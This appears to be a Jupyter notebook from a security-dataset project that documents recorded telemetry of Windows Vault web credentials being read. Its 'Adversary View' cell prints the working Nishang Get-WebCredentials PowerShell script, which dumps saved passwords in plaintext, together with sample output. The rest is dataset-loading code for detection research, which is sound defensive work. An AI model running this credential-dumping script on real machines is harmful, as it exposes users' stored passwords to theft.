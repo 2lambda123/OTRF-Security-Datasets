{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b511b3db",
   "metadata": {},
   "source": [
    "# Windows Vault Web Credentials"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d802734",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "32c039c8",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/28 |\n",
    "| Modification Date | 2020/10/28 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1055](https://attack.mitre.org/techniques/T1055) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae346dc0",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors accessing the Windows Vault and reading web credentials saved."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ce4f48d",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "19b1b1a9",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_windows_vault_web_credentials.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_windows_vault_web_credentials.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "553b0856",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "103148ae",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a5a9a17c",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | PowerShell | [PowerShell](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3edcbaaa",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Add Web Credentials\n",
    "-------------------\n",
    "PS > $pv = New-Object Windows.Security.Credentials.PasswordVault\n",
    "PS > $pw = New-Object Windows.Security.Credentials.PasswordCredential('http://ossemproject.com', 'pgustavo', 'Pass@Word')\n",
    "PS >$pv.Add($pw)\n",
    "\n",
    "Import Get-WebCredentials\n",
    "-------------------------\n",
    "function Get-WebCredentials\n",
    "{\n",
    "  <#\n",
    "  .SYNOPSIS\n",
    "  Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)\n",
    "  .DESCRIPTION\n",
    "  This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script \n",
    "  also needs PowerShell v3 onwards and must be run from an elevated shell.\n",
    "  .EXAMPLE\n",
    "  PS > Get-WebCredentials\n",
    "  .LINK\n",
    "  https://github.com/samratashok/nishang\n",
    "  #>\n",
    "  [CmdletBinding()] Param ()\n",
    "  \n",
    "  \n",
    "  #http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage\n",
    "  $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n",
    "  $VaultObj = new-object Windows.Security.Credentials.PasswordVault\n",
    "  $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }\n",
    "}\n",
    "\n",
    "Run Get-WebCredentials\n",
    "----------------------\n",
    "PS C:\\Users\\wardog> Get-WebCredentials\n",
    "\n",
    "UserName Resource                Password  Properties\n",
    "-------- --------                --------  ----------\n",
    "pgustavo http://ossemproject.com Pass@Word {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...\n",
    "\n",
    "\n",
    "PS C:\\Users\\wardog>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8232f262",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "faab4038",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72a37eec",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_windows_vault_web_credentials.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2da53dce",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01742375",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7eb25b3e",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de363890",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c5b617c",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
